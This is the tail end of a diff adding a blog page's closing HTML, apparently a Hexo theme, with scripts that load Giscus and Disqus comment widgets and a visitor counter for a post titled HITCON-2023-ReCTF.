class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"data-loading":"lazy"}
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'a45s67/a45s67.github.io',
+      'data-repo-id': 'MDEwOlJlcG9zaXRvcnkyMjczMzA1OTY=',
+      'data-category-id': 'DIC_kwDODYzKJM4CR_uz',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+
+  const disqusReset = conf => {
+    window.DISQUS && window.DISQUS.reset({
+      reload: true,
+      config: conf
+    })
+  }
+
+  const loadDisqus = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyDisqus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    window.disqus_identifier = isShuoshuo ? path : '/2023/08/27/HITCON-2023-ReCTF/'
+    window.disqus_url = isShuoshuo ? location.origin + path : 'https://sakana.tw/2023/08/27/HITCON-2023-ReCTF/'
+
+    const disqus_config = function () {
+      this.page.url = disqus_url
+      this.page.identifier = disqus_identifier
+      this.page.title = 'HITCON-2023-ReCTF'
+    }
+
+    if (window.DISQUS) disqusReset(disqus_config)
+    else {
+      const script = document.createElement('script')
+      script.src = 'https://a45s67-blog.disqus.com/embed.js'
+      script.setAttribute('data-timestamp', +new Date())
+      document.head.appendChild(script)
+    }
+
+    btf.addGlobalFn('themeChange', () => disqusReset(disqus_config), 'disqus')
+  }
+
+  const getCount = async() => {
+    try {
+      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
+      if (!eleGroup) return
+      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')
+
+      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=a45s67-blog&api_key=&thread:link=${cleanedLinks}`,{
+        method: 'GET'
+      })
+      const result = await res.json()
+
+      const count = result.response.length ? result.response[0].posts : 0
+      eleGroup.textContent = count
+    } catch (err) {
+      console.error(err)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Giscus' === 'Disqus'
+      ? window.shuoshuoComment = { loadComment: loadDisqus }
+      : window.loadOtherComment = loadDisqus
+    return
+  }
+
+  if ('Giscus' === 'Disqus' || !false) {
+    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+    else {
+      loadDisqus()
+      
+    }
+  } else {
+    window.loadOtherComment = loadDisqus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
